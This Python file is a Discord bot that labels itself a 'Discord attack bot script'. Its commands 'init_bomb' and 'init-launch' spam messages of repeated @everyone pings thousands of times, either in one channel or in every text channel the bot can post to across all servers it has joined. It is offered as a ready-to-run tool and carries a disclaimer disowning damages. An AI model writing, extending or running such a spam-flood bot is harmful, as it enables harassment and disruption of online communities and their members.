import aiohttp
import discord
from discord.ext import commands, tasks
import discord.ext
import threading
import aiohttp



class colors:
    reset = '\033[0m'
    bold = '\033[01m'
    disable = '\033[02m'
    underline = '\033[04m'
    reverse = '\033[07m'
    strikethrough = '\033[09m'
    invisible = '\033[08m'
    
    class fg:
            black = '\033[30m'
            red = '\033[31m'
            green = '\033[32m'
            orange = '\033[33m'
            blue = '\033[34m'
            purple = '\033[35m'
            cyan = '\033[36m'
            lightgrey = '\033[37m'
            darkgrey = '\033[90m'
            lightred = '\033[91m'
            lightgreen = '\033[92m'
            yellow = '\033[93m'
            lightblue = '\033[94m'
            pink = '\033[95m'
            lightcyan = '\033[96m'


intents = discord.Intents.all()
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix="$", intents=intents)


@bot.event
async def on_ready():
    print(colors.fg.cyan, "[i] Bot is ready")
    print(colors.reset)

@bot.event
async def on_guild_join(guild):
    print(colors.fg.cyan, "[i] Bot has joined a guild")
    print(colors.reset)
    print("Guild ID:", guild.id)
    

@bot.command(name="testping")
async def testping(ctx):
    await ctx.send("@everyone")
    print("[i] Pinged @everyone")


@bot.command(name="init_bomb")
async def init_nuke(ctx):
    try:
        for n in range(9999):
            await ctx.send("@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone  ")
    except discord.errors.PrivilegedIntentsRequired:
        print(colors.fg.yellow, "[!] A require intents(s) aren't enabled. Check your bot intent in discord.dev website.")
        print(colors.reset)

@bot.command(name="get-texts")
async def textchannellst(ctx):
    text_channels_list = []
    for guild in bot.guilds:
        for channel in guild.text_channels:
            permssions = channel.permissions_for(ctx.guild.me)
            if permssions.send_messages:
                text_channels_list.append(channel.id)
            else:
                continue
    print("All text channels: ", text_channels_list)

@bot.command(name="init-launch")
async def init_launch(ctx):
    text_list = []
    for guild in bot.guilds:
        for channel in guild.text_channels:
            permssions = channel.permissions_for(ctx.guild.me)
            if permssions.send_messages:
                text_list.append(channel.id)
            else:
                continue
    if text_list != []:
        for n in range(99999):
            for channel in text_list:
                channel = bot.get_channel(channel)
                await channel.send("@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone ") 
        else:
            print("[!] No valid channels")
            print(colors.reset)

print(colors.fg.blue, "[ Discord attack bot script ]")
print(colors.reset)
print("Version 1.01")
print("WARNING: Run at your own risk! Dev of this tools will NOT be held responsible for any damages!")
print("Please enter your bot token")

try:
    token = str(input("Token: "))
    bot.run(token)
except aiohttp.client_exceptions.ClientConnectionError:
    print(colors.fg.red, "[X] Unable to connect. Check your Internet connection or Discord server is down.")
except discord.errors.LoginFailure:
    print(colors.fg.red, "[X] Can't login to your bot. Make sure your token is typed correctly.")
finally:
    pass
